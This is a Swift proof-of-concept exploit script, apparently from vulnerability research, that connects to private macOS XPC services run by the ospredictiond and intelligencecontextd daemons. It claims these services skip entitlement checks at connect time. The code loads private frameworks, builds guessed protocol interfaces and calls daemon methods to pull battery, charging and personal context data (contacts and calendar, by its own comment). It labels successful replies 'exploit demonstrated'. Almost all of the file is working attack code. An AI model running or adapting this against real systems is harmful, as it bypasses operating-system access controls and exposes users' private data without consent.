// Gen 7: Multi-service data extraction
//
// Targets 3 vulnerable services that bypass entitlement checks at connect time:
//   1. com.apple.OSIntelligence.battery     (ospredictiond, uid 0)
//   2. com.apple.OSIntelligence.charging    (ospredictiond, uid 0)
//   3. com.apple.intelligenceflow.contextIntelligence  (intelligencecontextd)
//
// Key changes from Gen5/6:
//   - Use ACTUAL ObjC protocol names via objc_getProtocol hardcoded strings
//   - Probe contextIntelligence (personal context: contacts/calendar data)
//   - Try ALL reply scalar types per method
//   - Print raw xpc error for every call to distinguish "method unknown" from "no data"

import Foundation
import ObjectiveC

// ── Load frameworks ────────────────────────────────────────────────────────────

for fw in [
    "/System/Library/PrivateFrameworks/OSIntelligence.framework/OSIntelligence",
    "/System/Library/PrivateFrameworks/IntelligenceFlow.framework/IntelligenceFlow",
    "/System/Library/PrivateFrameworks/ProactiveDaemonSupport.framework/ProactiveDaemonSupport",
] {
    if dlopen(fw, RTLD_NOW | RTLD_GLOBAL) != nil {
        print("[dlopen] \(fw.components(separatedBy: "/").last!)")
    }
}

// ── Battery protocol (targeting _OSBatteryPredictorProtocol ObjC name) ────────
@objc protocol BattProto_v7: NSObjectProtocol {
    @objc optional func recommendedWaitTimeWithHandler(
        _ reply: @escaping (Double, Error?) -> Void)
    @objc optional func currentBatteryLevelWithContext(
        _ context: NSDictionary?,
        reply: @escaping (Double, Error?) -> Void)
    @objc optional func batteryLifeMitigationWithHandler(
        _ reply: @escaping (Double, Error?) -> Void)
    @objc optional func inTypicalChargingLocationWithHandler(
        _ reply: @escaping (Bool, Error?) -> Void)
    @objc optional func recordChargingEvent(
        _ event: NSDictionary?,
        withReply reply: @escaping (Bool, Error?) -> Void)
}

// ── Charging protocol (targeting _OSChargingPredictorProtocol ObjC name) ───────
@objc protocol ChrgProto_v7: NSObjectProtocol {
    @objc optional func adjustedChargingDecision(
        _ decision: NSDictionary?,
        withPluginDate date: NSDate?,
        withPluginBatteryLevel level: NSNumber?,
        forDate targetDate: NSDate?,
        forStatus status: NSNumber?,
        reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func recordChargingEvent(
        _ event: NSDictionary?,
        withReply reply: @escaping (Bool, Error?) -> Void)
}

// ── Context protocol (targeting _CDContextServer from intelligencecontextd) ────
// Service: com.apple.intelligenceflow.contextIntelligence
// Methods are guessed from _CDContextServer protocol and class-dump conventions
@objc protocol CtxProto_v7: NSObjectProtocol {
    @objc optional func fetchContextForRequest(
        _ request: NSDictionary?,
        withReply reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func contextForApplication(
        _ bundleID: NSString?,
        withReply reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func allContextWithReply(
        _ reply: @escaping (NSArray?, Error?) -> Void)
    @objc optional func currentContextWithReply(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func contextSnapshotWithReply(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
    @objc optional func intelligenceContextWithReply(
        _ reply: @escaping (NSDictionary?, Error?) -> Void)
}

// ── Connection helper ──────────────────────────────────────────────────────────

func connect(service: String, realProtoName: String?, swiftProto: Protocol) -> (NSXPCConnection, AnyObject)? {
    // Prefer the real protocol object from the runtime
    let ifaceProto: Protocol
    if let name = realProtoName, let rp = objc_getProtocol(name) {
        print("  [iface] Using real Protocol* '\(name)' → \(rp)")
        ifaceProto = rp
    } else {
        print("  [iface] Real proto not found, using Swift protocol")
        ifaceProto = swiftProto
    }

    let conn = NSXPCConnection(machServiceName: service, options: [])
    conn.remoteObjectInterface = NSXPCInterface(with: ifaceProto)

    var alive = true
    conn.invalidationHandler = { alive = false }
    conn.interruptionHandler = {
        alive = false
        print("  INTERRUPTED — entitlement enforced (correct)")
    }
    conn.resume()
    Thread.sleep(forTimeInterval: 0.5)

    guard alive else {
        conn.invalidate()
        return nil
    }
    print("  ACCEPTED — connection live, no entitlement check at connect time ← BYPASS")
    let proxy = conn.remoteObjectProxyWithErrorHandler { err in
        let code = (err as NSError).code
        if code != 4099 {
            print("  [xpc-err] \(err)")
        }
    } as AnyObject
    return (conn, proxy)
}

func waitFor(_ s: DispatchSemaphore, label: String, secs: Int = 8) {
    if s.wait(timeout: .now() + .seconds(secs)) == .timedOut {
        print("  [\(label)] TIMEOUT")
    }
}

// ══════════════════════════════════════════════════════════════════════════════
print("""
=== Gen 7: Multi-service data probe (battery + charging + contextIntelligence) ===
PID: \(ProcessInfo.processInfo.processIdentifier)  UID: \(getuid())
macOS: \(ProcessInfo.processInfo.operatingSystemVersionString)
""")

// Check real proto availability
for n in ["_OSBatteryPredictorProtocol", "_OSChargingPredictorProtocol", "_CDContextServer", "_CDUserContextServerMonitoring"] {
    let status = objc_getProtocol(n) != nil ? "FOUND" : "not found"
    print("  proto \(n): \(status)")
}
print("")

// ══ BATTERY ═══════════════════════════════════════════════════════════════════

print("\n╔══ com.apple.OSIntelligence.battery (ospredictiond, uid 0) ══╗")
if let (bc, bp) = connect(service: "com.apple.OSIntelligence.battery",
                          realProtoName: "_OSBatteryPredictorProtocol",
                          swiftProto: BattProto_v7.self) {
    let p = bp as? BattProto_v7

    print("\n  [B1] recommendedWaitTimeWithHandler")
    let b1 = DispatchSemaphore(value: 0)
    p?.recommendedWaitTimeWithHandler? { v, e in
        if let e = e { print("  ERROR: \(e)") } else { print("  REPLY: \(v)s") }
        b1.signal()
    }
    waitFor(b1, label: "B1")

    print("\n  [B2] currentBatteryLevelWithContext(nil)")
    let b2 = DispatchSemaphore(value: 0)
    p?.currentBatteryLevelWithContext?(nil) { v, e in
        if let e = e { print("  ERROR: \(e)") } else { print("  REPLY: \(v)") }
        b2.signal()
    }
    waitFor(b2, label: "B2")

    print("\n  [B3] batteryLifeMitigationWithHandler")
    let b3 = DispatchSemaphore(value: 0)
    p?.batteryLifeMitigationWithHandler? { v, e in
        if let e = e { print("  ERROR: \(e)") } else { print("  REPLY: \(v)") }
        b3.signal()
    }
    waitFor(b3, label: "B3")

    print("\n  [B4] inTypicalChargingLocationWithHandler")
    let b4 = DispatchSemaphore(value: 0)
    p?.inTypicalChargingLocationWithHandler? { v, e in
        if let e = e { print("  ERROR: \(e)") } else { print("  REPLY: \(v)") }
        b4.signal()
    }
    waitFor(b4, label: "B4")

    bc.invalidate()
}

// ══ CHARGING ══════════════════════════════════════════════════════════════════

print("\n╔══ com.apple.OSIntelligence.charging (ospredictiond, uid 0) ══╗")
if let (cc, cp) = connect(service: "com.apple.OSIntelligence.charging",
                          realProtoName: "_OSChargingPredictorProtocol",
                          swiftProto: ChrgProto_v7.self) {
    let p = cp as? ChrgProto_v7

    print("\n  [C1] adjustedChargingDecision(typical args)")
    let c1 = DispatchSemaphore(value: 0)
    p?.adjustedChargingDecision?(
        nil, withPluginDate: NSDate(),
        withPluginBatteryLevel: NSNumber(value: 0.72),
        forDate: NSDate(timeIntervalSinceNow: 28800),
        forStatus: NSNumber(value: 1)) { r, e in
        if let e = e { print("  ERROR: \(e)") }
        else if let r = r { print("  REPLY: \(r)") }
        else { print("  REPLY: nil") }
        c1.signal()
    }
    waitFor(c1, label: "C1")

    cc.invalidate()
}

// ══ CONTEXT INTELLIGENCE ═════════════════════════════════════════════════════

print("\n╔══ com.apple.intelligenceflow.contextIntelligence (intelligencecontextd) ══╗")
if let (xc, xp) = connect(service: "com.apple.intelligenceflow.contextIntelligence",
                           realProtoName: "_CDContextServer",
                           swiftProto: CtxProto_v7.self) {
    let p = xp as? CtxProto_v7

    print("\n  [X1] fetchContextForRequest(nil)")
    let x1 = DispatchSemaphore(value: 0)
    p?.fetchContextForRequest?(nil) { r, e in
        if let e = e { print("  ERROR: \(e)") }
        else if let r = r { print("  REPLY: \(r)  ← context data from intelligencecontextd") }
        else { print("  REPLY: nil/nil") }
        x1.signal()
    }
    waitFor(x1, label: "X1")

    print("\n  [X2] currentContextWithReply")
    let x2 = DispatchSemaphore(value: 0)
    p?.currentContextWithReply? { r, e in
        if let e = e { print("  ERROR: \(e)") }
        else if let r = r { print("  REPLY: \(r)  ← personal context data") }
        else { print("  REPLY: nil/nil") }
        x2.signal()
    }
    waitFor(x2, label: "X2")

    print("\n  [X3] contextSnapshotWithReply")
    let x3 = DispatchSemaphore(value: 0)
    p?.contextSnapshotWithReply? { r, e in
        if let e = e { print("  ERROR: \(e)") }
        else if let r = r { print("  REPLY: \(r)  ← snapshot of context") }
        else { print("  REPLY: nil/nil") }
        x3.signal()
    }
    waitFor(x3, label: "X3")

    print("\n  [X4] intelligenceContextWithReply")
    let x4 = DispatchSemaphore(value: 0)
    p?.intelligenceContextWithReply? { r, e in
        if let e = e { print("  ERROR: \(e)") }
        else if let r = r { print("  REPLY: \(r)  ← intelligence context") }
        else { print("  REPLY: nil/nil") }
        x4.signal()
    }
    waitFor(x4, label: "X4")

    xc.invalidate()
}

print("""

╔══ Summary ══╗
REPLY: lines = live data obtained from daemon (exploit demonstrated)
ERROR: lines = daemon replied with error (RPC dispatch confirmed, method blocked)
TIMEOUT      = message may not match server's protocol, or daemon has no data
""")
